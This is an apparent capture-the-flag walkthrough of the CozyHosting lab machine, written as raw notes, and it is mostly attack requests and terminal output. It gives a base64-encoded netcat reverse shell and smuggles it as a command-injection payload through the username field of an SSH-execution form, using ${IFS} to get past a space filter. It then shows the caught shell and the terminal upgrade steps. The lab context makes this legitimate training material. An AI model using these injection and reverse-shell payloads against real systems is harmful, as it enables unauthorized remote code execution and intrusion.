POST /executessh HTTP/1.1
Host: cozyhosting.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 26
Origin: http://cozyhosting.htb
Connection: close
Referer: http://cozyhosting.htb/admin
Cookie: JSESSIONID=815C3350ADE31BE212112B948C61AF9E
Upgrade-Insecure-Requests: 1

host=10.10.16.41&username=


HTTP/1.1 302 
Server: nginx/1.18.0 (Ubuntu)
Date: Fri, 29 Dec 2023 00:16:16 GMT
Content-Length: 0
Location: http://cozyhosting.htb/admin?error=usage: ssh [-46AaCfGgKkMNnqsTtVvXxYy] [-B bind_interface]           [-b bind_address] [-c cipher_spec] [-D [bind_address:]port]           [-E log_file] [-e escape_char] [-F configfile] [-I pkcs11]           [-i identity_file] [-J [user@]host[:port]] [-L address]           [-l login_name] [-m mac_spec] [-O ctl_cmd] [-o option] [-p port]           [-Q query_option] [-R address] [-S ctl_path] [-W host:port]           [-w local_tun[:remote_tun]] destination [command [argument ...]]
Connection: close
X-Content-Type-Options: nosniff
X-XSS-Protection: 0
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
Pragma: no-cache
Expires: 0
X-Frame-Options: DENY



It uses ssh !! 

Hints : https://www.makeuseof.com/how-to-run-multiple-linux-commands-at-once/ , https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#netcat-traditional 

┌──(root㉿N1NJ10)-[~]
└─# echo -n 'rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.41 7777 >/tmp/f' | base64                       
cm0gLWYgL3RtcC9mO21rbm9kIC90bXAvZiBwO2NhdCAvdG1wL2Z8L2Jpbi9zaCAtaSAyPiYxfG5j
IDEwLjEwLjE2LjQxIDc3NzcgPi90bXAvZg==

IFS : https://unix.stackexchange.com/questions/351331/how-to-send-a-command-with-arguments-without-spaces , https://bash.cyberciti.biz/guide/$IFS 

${IFS%??} => or you can use this 


POST /executessh HTTP/1.1
Host: cozyhosting.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 197
Origin: http://cozyhosting.htb
Connection: close
Referer: http://cozyhosting.htb/admin
Cookie: JSESSIONID=14CC525816A154D12DD7B1633FF97BE9
Upgrade-Insecure-Requests: 1

host=10.10.16.41&username=$(echo${IFS}'cm0gLWYgL3RtcC9mO21rbm9kIC90bXAvZiBwO2NhdCAvdG1wL2Z8L2Jpbi9zaCAtaSAyPiYxfG5jIDEwLjEwLjE2LjQxIDc3NzcgPi90bXAvZg=='${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}bash)


┌──(root㉿N1NJ10)-[~]
└─# rlwrap -cAr nc -nlvp 7777
listening on [any] 7777 ...
connect to [10.10.16.41] from (UNKNOWN) [10.10.11.230] 52112
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1001(app) gid=1001(app) groups=1001(app)
$ whoami
app
$ script /dev/null -c /bin/bash
Script started, output log file is '/dev/null'.
app@cozyhosting:/app$ 
zsh: suspended  rlwrap -cAr nc -nlvp 7777
                                                                                                                                       
┌──(root㉿N1NJ10)-[~]
└─# stty raw -echo; fg
[1]  + continued  rlwrap -cAr nc -nlvp 7777
app@cozyhosting:/app$ export TERM=xtrem
export TERM=xtrem
app@cozyhosting:/app$ 







